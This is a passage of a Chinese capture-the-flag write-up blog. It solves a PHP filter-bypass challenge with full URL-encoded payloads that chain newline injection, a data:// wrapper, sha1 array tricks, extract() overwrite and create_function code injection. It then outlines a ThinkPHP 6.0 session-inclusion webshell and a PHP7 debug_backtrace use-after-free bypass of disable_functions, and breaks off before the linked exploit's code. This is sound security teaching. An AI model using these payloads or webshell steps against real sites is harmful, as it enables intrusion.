Luck!&lt;/B&gt;&lt;br&gt;&lt;/font&gt;&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$_SERVER</span>) &#123; </span><br><span class="line">    <span class="keyword">if</span> (</span><br><span class="line">        preg_match(<span class="string">&#x27;/shana|debu|aqua|cute|arg|code|flag|system|exec|passwd|ass|eval|sort|shell|ob|start|mail|\$|sou|show|cont|high|reverse|flip|rand|scan|chr|local|sess|id|source|arra|head|light|read|inc|info|bin|hex|oct|echo|print|pi|\.|\&quot;|\&#x27;|log/i&#x27;</span>, <span class="variable">$_SERVER</span>[<span class="string">&#x27;QUERY_STRING&#x27;</span>])</span><br><span class="line">        )  </span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;You seem to want to do something bad?&#x27;</span>); </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!preg_match(<span class="string">&#x27;/http|https/i&#x27;</span>, <span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>])) &#123;</span><br><span class="line">    <span class="keyword">if</span> (preg_match(<span class="string">&#x27;/^aqua_is_cute$/&#x27;</span>, <span class="variable">$_GET</span>[<span class="string">&#x27;debu&#x27;</span>]) &amp;&amp; <span class="variable">$_GET</span>[<span class="string">&#x27;debu&#x27;</span>] !== <span class="string">&#x27;aqua_is_cute&#x27;</span>) &#123; </span><br><span class="line">        <span class="variable">$file</span> = <span class="variable">$_GET</span>[<span class="string">&quot;file&quot;</span>]; </span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;Neeeeee! Good Job!&lt;br&gt;&quot;</span>;</span><br><span class="line">    &#125; </span><br><span class="line">&#125; <span class="keyword">else</span> <span class="keyword">die</span>(<span class="string">&#x27;fxck you! What do you want to do ?!&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$_REQUEST</span>) &#123; </span><br><span class="line">    <span class="keyword">foreach</span>(<span class="variable">$_REQUEST</span> <span class="keyword">as</span> <span class="variable">$value</span>) &#123; </span><br><span class="line">        <span class="keyword">if</span>(preg_match(<span class="string">&#x27;/[a-zA-Z]/i&#x27;</span>, <span class="variable">$value</span>))  </span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&#x27;fxck you! I hate English!&#x27;</span>); </span><br><span class="line">    &#125; </span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (file_get_contents(<span class="variable">$file</span>) !== <span class="string">&#x27;debu_debu_aqua&#x27;</span>)</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;Aqua is the cutest five-year-old child in the world! Isn&#x27;t it ?&lt;br&gt;&quot;</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> ( sha1(<span class="variable">$shana</span>) === sha1(<span class="variable">$passwd</span>) &amp;&amp; <span class="variable">$shana</span> != <span class="variable">$passwd</span> )&#123;</span><br><span class="line">    extract(<span class="variable">$_GET</span>[<span class="string">&quot;flag&quot;</span>]);</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;Very good! you know my password. But what is flag?&lt;br&gt;&quot;</span>;</span><br><span class="line">&#125; <span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;fxck you! you don&#x27;t know my password! And you don&#x27;t know sha1! why you come here!&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(preg_match(<span class="string">&#x27;/^[a-z0-9]*$/isD&#x27;</span>, <span class="variable">$code</span>) || </span><br><span class="line">preg_match(<span class="string">&#x27;/fil|cat|more|tail|tac|less|head|nl|tailf|ass|eval|sort|shell|ob|start|mail|\`|\&#123;|\%|x|\&amp;|\$|\*|\||\&lt;|\&quot;|\&#x27;|\=|\?|sou|show|cont|high|reverse|flip|rand|scan|chr|local|sess|id|source|arra|head|light|print|echo|read|inc|flag|1f|info|bin|hex|oct|pi|con|rot|input|\.|log|\^/i&#x27;</span>, <span class="variable">$arg</span>) ) &#123; </span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;&lt;br /&gt;Neeeeee~! I have disabled all dangerous functions! You can&#x27;t get my flag =w=&quot;</span>); </span><br><span class="line">&#125; <span class="keyword">else</span> &#123; </span><br><span class="line">    <span class="keyword">include</span> <span class="string">&quot;flag.php&quot;</span>;</span><br><span class="line">    <span class="variable">$code</span>(<span class="string">&#x27;&#x27;</span>, <span class="variable">$arg</span>); </span><br><span class="line">&#125; <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>咱一个一个看。</p><h3 id="SERVER-‘QUERY-STRING’-正则绕过"><a href="#SERVER-‘QUERY-STRING’-正则绕过" class="headerlink" title="$_SERVER[‘QUERY_STRING’]正则绕过"></a>$_SERVER[‘QUERY_STRING’]正则绕过</h3><p>先解释一下$_SERVER[‘QUERY_STRING’]，这个简单测试一下就可以发现。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">url &#x3D; &quot;http:&#x2F;&#x2F;localhost&#x2F;aaa&quot;</span><br><span class="line">结果:</span><br><span class="line">    $_SERVER[&#39;QUERY_STRING&#39;] &#x3D; &quot;&quot;</span><br><span class="line"></span><br><span class="line">url &#x3D; &quot;http:&#x2F;&#x2F;localhost&#x2F;aaa?aaa&quot;</span><br><span class="line">结果:</span><br><span class="line">    $_SERVER[&#39;QUERY_STRING&#39;] &#x3D; &quot;aaa&quot;</span><br><span class="line"></span><br><span class="line">url &#x3D; &quot;http:&#x2F;&#x2F;localhost&#x2F;aaa?aaa&#x3D;111&quot;</span><br><span class="line">结果:</span><br><span class="line">    $_SERVER[&#39;QUERY_STRING&#39;] &#x3D; &quot;aaa&#x3D;111&quot;</span><br><span class="line">    </span><br><span class="line">可见$_SERVER[&#39;QUERY_STRING&#39;] 获取查询语句 取的是?之后的值</span><br></pre></td></tr></table></figure><p>而且$_SERVER[‘QUERY_STRING’]是无法进行urldecode()，而$_GET[]是可以进行urldecode()，所以我们可以使用url编码进行绕过。</p><p><img src="https://gitee.com/R1ta_Violet/blogimg/raw/master/imgs/image-20210726134552144.png"></p><h3 id="字符串正则匹配绕过"><a href="#字符串正则匹配绕过" class="headerlink" title="字符串正则匹配绕过"></a>字符串正则匹配绕过</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (!preg_match(<span class="string">&#x27;/http|https/i&#x27;</span>, <span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>])) &#123;</span><br><span class="line">    <span class="keyword">if</span> (preg_match(<span class="string">&#x27;/^aqua_is_cute$/&#x27;</span>, <span class="variable">$_GET</span>[<span class="string">&#x27;debu&#x27;</span>]) &amp;&amp; <span class="variable">$_GET</span>[<span class="string">&#x27;debu&#x27;</span>] !== <span class="string">&#x27;aqua_is_cute&#x27;</span>) &#123; </span><br><span class="line">        <span class="variable">$file</span> = <span class="variable">$_GET</span>[<span class="string">&quot;file&quot;</span>]; </span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;Neeeeee! Good Job!&lt;br&gt;&quot;</span>;</span><br><span class="line">    &#125; </span><br><span class="line">&#125; <span class="keyword">else</span> <span class="keyword">die</span>(<span class="string">&#x27;fxck you! What do you want to do ?!&#x27;</span>);</span><br></pre></td></tr></table></figure><p>可见我们需要使正则能在debu中匹配到<code>aqua_is_cute</code>，但又不能使debu==’aqua_is_cute’。</p><p>这种我们可以用%0a换行污染进行绕过，payload:</p><blockquote><p>?debu=aqua_is_cute%0a</p></blockquote><p><img src="https://gitee.com/R1ta_Violet/blogimg/raw/master/imgs/image-20210726135040913.png"></p><h3 id="REQUEST正则绕过"><a href="#REQUEST正则绕过" class="headerlink" title="$_REQUEST正则绕过"></a>$_REQUEST正则绕过</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="variable">$_REQUEST</span>) &#123; </span><br><span class="line">    <span class="keyword">foreach</span>(<span class="variable">$_REQUEST</span> <span class="keyword">as</span> <span class="variable">$value</span>) &#123; </span><br><span class="line">        <span class="keyword">if</span>(preg_match(<span class="string">&#x27;/[a-zA-Z]/i&#x27;</span>, <span class="variable">$value</span>))  </span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&#x27;fxck you! I hate English!&#x27;</span>); </span><br><span class="line">    &#125; </span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure><p><code>foreach</code>将<code>$_REQUEST</code>的键值赋值给了<code>$value</code>，然后是正则匹配<code>$value</code>是否含有字母，否则就die()。</p><p>这里要说一下，$_REQUEST可以同时获取<code>$_GET</code>和<code>$_POST</code>的值，但是是有顺序的。</p><p><img src="https://gitee.com/R1ta_Violet/blogimg/raw/master/imgs/image-20210726150128123.png"></p><p>而具体顺序决定是在php.ini配置文件中。</p><p><img src="https://gitee.com/R1ta_Violet/blogimg/raw/master/imgs/image-20210726150339554.png"></p><blockquote><p>This directive describes the order in which PHP registers GET, POSTand Cookie variables into the _REQUEST array. Registration is donefrom left to right, newer values override older values. </p></blockquote><p>可以看到优先值是POST才到GET，那么我们就可以用POST覆盖GET的值进行绕过。</p><p><img src="https://gitee.com/R1ta_Violet/blogimg/raw/master/imgs/image-20210726150855285.png"></p><p><img src="https://gitee.com/R1ta_Violet/blogimg/raw/master/imgs/image-20210726150923698.png"></p><p>这样就可以绕过$_REQUEST正则了。</p><h3 id="file-get-contents-文件比较绕过"><a href="#file-get-contents-文件比较绕过" class="headerlink" title="file_get_contents()文件比较绕过"></a>file_get_contents()文件比较绕过</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (file_get_contents(<span class="variable">$file</span>) !== <span class="string">&#x27;debu_debu_aqua&#x27;</span>)</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;Aqua is the cutest five-year-old child in the world! Isn&#x27;t it ?&lt;br&gt;&quot;</span>);</span><br></pre></td></tr></table></figure><p>这里需要file_get_contents($file)得到的字符串与<code>debu_debu_aqua</code>相等，而我们不清楚是否存在含有<code>debu_debu_aqua</code>字符串的文件，且文件名也是未知的，所以我们可以使用伪协议进行绕过。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">data:&#x2F;&#x2F;text&#x2F;plain,debu_debu_aqua</span><br><span class="line">或者</span><br><span class="line">data:&#x2F;&#x2F;text&#x2F;plain;base64,ZGVidV9kZWJ1X2FxdWE&#x3D;</span><br></pre></td></tr></table></figure><h3 id="sha1-比较绕过"><a href="#sha1-比较绕过" class="headerlink" title="sha1()比较绕过"></a>sha1()比较绕过</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> ( sha1(<span class="variable">$shana</span>) === sha1(<span class="variable">$passwd</span>) &amp;&amp; <span class="variable">$shana</span> != <span class="variable">$passwd</span> )&#123;</span><br><span class="line">    extract(<span class="variable">$_GET</span>[<span class="string">&quot;flag&quot;</span>]);</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;Very good! you know my password. But what is flag?&lt;br&gt;&quot;</span>;</span><br><span class="line">&#125; <span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;fxck you! you don&#x27;t know my password! And you don&#x27;t know sha1! why you come here!&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里需要<code>sha1($shana)</code>与<code>sha1($passwd)</code>的值相等，且<code>$shana</code>!=<code>$passwd</code>，否则die()。</p><p>由于sha1()函数无法处理数组，所以我们可以使用数组绕过。</p><p><img src="https://gitee.com/R1ta_Violet/blogimg/raw/master/imgs/image-20210726153139282.png"></p><h3 id="create-function代码注入"><a href="#create-function代码注入" class="headerlink" title="create_function代码注入"></a>create_function代码注入</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(preg_match(<span class="string">&#x27;/^[a-z0-9]*$/isD&#x27;</span>, <span class="variable">$code</span>) || </span><br><span class="line">preg_match(<span class="string">&#x27;/fil|cat|more|tail|tac|less|head|nl|tailf|ass|eval|sort|shell|ob|start|mail|\`|\&#123;|\%|x|\&amp;|\$|\*|\||\&lt;|\&quot;|\&#x27;|\=|\?|sou|show|cont|high|reverse|flip|rand|scan|chr|local|sess|id|source|arra|head|light|print|echo|read|inc|flag|1f|info|bin|hex|oct|pi|con|rot|input|\.|log|\^/i&#x27;</span>, <span class="variable">$arg</span>) ) &#123; </span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;&lt;br /&gt;Neeeeee~! I have disabled all dangerous functions! You can&#x27;t get my flag =w=&quot;</span>); </span><br><span class="line">&#125; <span class="keyword">else</span> &#123; </span><br><span class="line">    <span class="keyword">include</span> <span class="string">&quot;flag.php&quot;</span>;</span><br><span class="line">    <span class="variable">$code</span>(<span class="string">&#x27;&#x27;</span>, <span class="variable">$arg</span>); </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>到最后了，这里ban了超级多的东西，但是又有一个<code>incoude &quot;flag.php&quot;</code>，那这明显不是让我们进行RCE<code>cat flag.php</code>的了。</p><p>由于上面有一个<code>extract($_GET[&quot;flag&quot;]);</code>，这样我们可以通过构造flag[code]数组进行<code>$code</code>变量覆盖，这样子<code>$code</code>和<code>$arg</code>都是可控的了，于是就可以进行代码注入，payload:</p><blockquote><p>flag[arg]=}a();//&amp;flag[code]=create_function</p></blockquote><p>先解释下原理，create_function()可以构造一个lambda类型的函数。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$myfun</span> = create_function(<span class="string">&#x27;$a,$b&#x27;</span>,<span class="string">&#x27;return($a+$b);&#x27;</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$myfun</span>(<span class="number">1</span>,<span class="number">2</span>);</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/R1ta_Violet/blogimg/raw/master/imgs/image-20210726162030048.png"></p><p>这相当于</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">myfunc</span>(<span class="params"><span class="variable">$a</span>,<span class="variable">$b</span></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">return</span>(<span class="variable">$a</span>+<span class="variable">$b</span>)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>而$code是可控的，所以我们可以进行人工闭合。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$myfun</span> = create_function(<span class="string">&#x27;$a,$b&#x27;</span>,<span class="string">&#x27;return($a+$b);&#125;phpinfo();//&#x27;</span>);</span><br><span class="line"><span class="variable">$myfun</span>(<span class="number">1</span>,<span class="number">2</span>);</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/R1ta_Violet/blogimg/raw/master/imgs/image-20210726162333448.png"></p><p>于是就可以进行代码注入了。</p><h3 id="获取flag"><a href="#获取flag" class="headerlink" title="获取flag"></a>获取flag</h3><p>由于<code>include &quot;flag.php&quot;</code>了，我们可以用<code>get_defined_vars()</code>将所有变量的值输出出来。</p><p>最终payload:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">?%66%69%6c%65&#x3D;data:&#x2F;&#x2F;text&#x2F;plain,%64%65%62%75%5f%64%65%62%75%5f%61%71%75%61&amp;%64%65%62%75&#x3D;%61%71%75%61%5f%69%73%5f%63%75%74%65%0a&amp;%66%6c%61%67%5b%61%72%67%5d&#x3D;%7d%76%61%72%5f%64%75%6d%70%28%67%65%74%5f%64%65%66%69%6e%65%64%5f%76%61%72%73%28%29%29%3b%2f%2f&amp;%66%6c%61%67%5b%63%6f%64%65%5d&#x3D;%63%72%65%61%74%65%5f%66%75%6e%63%74%69%6f%6e&amp;%73%68%61%6e%61[]&#x3D;1&amp;%70%61%73%73%77%64[]&#x3D;2</span><br><span class="line"></span><br><span class="line">解码:</span><br><span class="line">?file&#x3D;data:&#x2F;&#x2F;text&#x2F;plain,debu_debu_aqua&amp;debu&#x3D;aqua_is_cute</span><br><span class="line">&amp;flag[arg]&#x3D;&#125;var_dump(get_defined_vars());&#x2F;&#x2F;&amp;flag[code]&#x3D;create_function&amp;shana[]&#x3D;1&amp;passwd[]&#x3D;2</span><br><span class="line"></span><br><span class="line">post:</span><br><span class="line">file&#x3D;1&amp;debu&#x3D;1</span><br></pre></td></tr></table></figure><p>可惜拿到了一个FakeFlag，但是好歹告诉了real_flag在<code>realfl4g.php</code>里。</p><p><img src="https://gitee.com/R1ta_Violet/blogimg/raw/master/imgs/image-20210726163659721.png"></p><p>接下来就需要包含<code>rea1fl4g.php</code>并且得到flag。</p><ul><li>由于include用不了，选择用require。</li><li>由于.用不了，可以使用base64_decode绕过。</li></ul><p>payload:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">?%66%69%6c%65&#x3D;data:&#x2F;&#x2F;text&#x2F;plain,%64%65%62%75%5f%64%65%62%75%5f%61%71%75%61&amp;%64%65%62%75&#x3D;%61%71%75%61%5f%69%73%5f%63%75%74%65%0a&amp;%66%6c%61%67%5b%61%72%67%5d&#x3D;%7d%72%65%71%75%69%72%65%28%62%61%73%65%36%34%5f%64%65%63%6f%64%65%28%63%6d%56%68%4d%57%5a%73%4e%47%63%75%63%47%68%77%29%29%3b%76%61%72%5f%64%75%6d%70%28%67%65%74%5f%64%65%66%69%6e%65%64%5f%76%61%72%73%28%29%29%3b%2f%2f&amp;%66%6c%61%67%5b%63%6f%64%65%5d&#x3D;%63%72%65%61%74%65%5f%66%75%6e%63%74%69%6f%6e&amp;%73%68%61%6e%61[]&#x3D;1&amp;%70%61%73%73%77%64[]&#x3D;2</span><br><span class="line"></span><br><span class="line">解码:</span><br><span class="line">?file&#x3D;data:&#x2F;&#x2F;text&#x2F;plain,debu_debu_aqua&amp;debu&#x3D;aqua_is_cute</span><br><span class="line">&amp;flag[arg]&#x3D;&#125;require(base64_decode(cmVhMWZsNGcucGhw));var_dump(get_defined_vars());&#x2F;&#x2F;&amp;flag[code]&#x3D;create_function&amp;shana[]&#x3D;1&amp;passwd[]&#x3D;2</span><br><span class="line"></span><br><span class="line">post:</span><br><span class="line">file&#x3D;1&amp;debu&#x3D;1</span><br></pre></td></tr></table></figure><p>但是拿到的还是FakeFlag，而且没有flag参数，查看源码发现<code>$rea1_f1114g</code>被<code>unset()</code>了。</p><p><img src="https://gitee.com/R1ta_Violet/blogimg/raw/master/imgs/image-20210726164445523.png"></p><p>选择直接读源码，由于<code>fopen()</code>和<code>fgets</code>都没有被ban，但由于只能一行一行的读，所有用while循环读。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">?%66%69%6c%65&#x3D;data:&#x2F;&#x2F;text&#x2F;plain,%64%65%62%75%5f%64%65%62%75%5f%61%71%75%61&amp;%64%65%62%75&#x3D;%61%71%75%61%5f%69%73%5f%63%75%74%65%0a&amp;%66%6c%61%67%5b%61%72%67%5d&#x3D;%7d%64%65%66%69%6e%65%28%61%2c%66%6f%70%65%6e%28%7e%28%8D%9A%9E%CE%99%93%CB%98%D1%8F%97%8F%29%2c%72%29%29%3b%77%68%69%6c%65%28%21%66%65%6f%66%28%61%29%29%76%61%72%5f%64%75%6d%70%28%66%67%65%74%73%28%61%29%29%3b%66%63%6c%6f%73%65%28%61%29%3b%2f%2f&amp;%66%6c%61%67%5b%63%6f%64%65%5d&#x3D;%63%72%65%61%74%65%5f%66%75%6e%63%74%69%6f%6e&amp;%73%68%61%6e%61[]&#x3D;1&amp;%70%61%73%73%77%64[]&#x3D;2</span><br><span class="line"></span><br><span class="line">解码：</span><br><span class="line">?file&#x3D;data:&#x2F;&#x2F;text&#x2F;plain,debu_debu_aqua&amp;debu&#x3D;aqua_is_cute</span><br><span class="line">&amp;flag[arg]&#x3D;&#125;define(a,fopen(~(%8D%9A%9E%CE%99%93%CB%98%D1%8F%97%8F),r));while(!feof(a))var_dump(fgets(a));fclose(a);&#x2F;&#x2F;&amp;flag[code]&#x3D;create_function&amp;shana[]&#x3D;1&amp;passwd[]&#x3D;2</span><br><span class="line"></span><br><span class="line">post:</span><br><span class="line">file&#x3D;1&amp;debu&#x3D;1</span><br></pre></td></tr></table></figure><p>base64_decode()本地测试可以用，但是放postman里直接跑就不行了，所以选择取反进行绕过。</p><p><img src="https://gitee.com/R1ta_Violet/blogimg/raw/master/imgs/image-20210726170246047.png"></p><p>最后得到flag。</p><p><img src="https://gitee.com/R1ta_Violet/blogimg/raw/master/imgs/image-20210726170403566.png"></p><blockquote><p>flag{89a3d450-9605-4f80-8692-215310ebc838}</p></blockquote><h2 id="GYCTF2020-EasyThinking"><a href="#GYCTF2020-EasyThinking" class="headerlink" title="[GYCTF2020]EasyThinking"></a>[GYCTF2020]EasyThinking</h2><h3 id="ThinkPhp6-0文件包含漏洞"><a href="#ThinkPhp6-0文件包含漏洞" class="headerlink" title="ThinkPhp6.0文件包含漏洞"></a>ThinkPhp6.0文件包含漏洞</h3><p>具体是个ThinkPhp6.0 Session 文件包含漏洞，<a href="https://www.bugfor.com/vuls/3540.html">漏洞分析具体看这里</a>。</p><p>我们具体看咋用，先直接注册一个账号。</p><p><img src="https://gitee.com/R1ta_Violet/blogimg/raw/master/imgs/image-20210727121657196.png"></p><p>修改PHPSESSID的值以达成文件包含，(注意限制了32长度，包含<code>.php</code></p><p><img src="https://gitee.com/R1ta_Violet/blogimg/raw/master/imgs/image-20210727122018176.png"></p><p>上传成功后可在search处写一句话木马。</p><p><img src="https://gitee.com/R1ta_Violet/blogimg/raw/master/imgs/image-20210727122151250.png"></p><p>上传成功后是储存在<code>/runtime/session/</code>里</p><p><img src="https://gitee.com/R1ta_Violet/blogimg/raw/master/imgs/image-20210727122634173.png"></p><h3 id="disable-functions绕过"><a href="#disable-functions绕过" class="headerlink" title="disable_functions绕过"></a>disable_functions绕过</h3><p>这里直接在phpinfo里可以看见ban了很多函数，虽然可以直接连接进蚁剑，但是我们没有权限直接查看flag，那八成就是通过readflag拿到flag了。</p><p><img src="https://gitee.com/R1ta_Violet/blogimg/raw/master/imgs/image-20210727125517310.png"></p><h4 id="蚁剑disable-functions绕过"><a href="#蚁剑disable-functions绕过" class="headerlink" title="蚁剑disable_functions绕过"></a>蚁剑disable_functions绕过</h4><p>可以用蚁剑里<code>disable_functions</code>插件中的<code>PHP7_Backtrace_UAF模式进行绕过</code>。</p><blockquote><p>漏洞原理:</p><p>漏洞利用的是 debug_backtrace这个函数，可以利用该函数的漏洞返回已经销毁的变量的引用达成堆溢出，漏洞为<a href="https://bugs.php.net/bug.php?id=76047">bug #76047</a>。</p></blockquote><p>选择<code>PHP7_Backtrace_UAF</code>模式，点击开始。</p><p><img src="https://gitee.com/R1ta_Violet/blogimg/raw/master/imgs/image-20210727130518048.png"></p><p>然后在虚拟终端直接<code>/readflag</code>，即可拿到flag。</p><p><img src="https://gitee.com/R1ta_Violet/blogimg/raw/master/imgs/image-20210727130637316.png"></p><h4 id="Exp上传绕过"><a href="#Exp上传绕过" class="headerlink" title="Exp上传绕过"></a>Exp上传绕过</h4><p>网上dalao写的<a href="https://github.com/mm0r1/exploits/blob/master/php7-backtrace-bypass/exploit.php">exp</a>，原理也是上面的<code>debug_backtrace()</code>，把command改成<code>/readflag</code>，然后通过蚁剑上传即可。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span 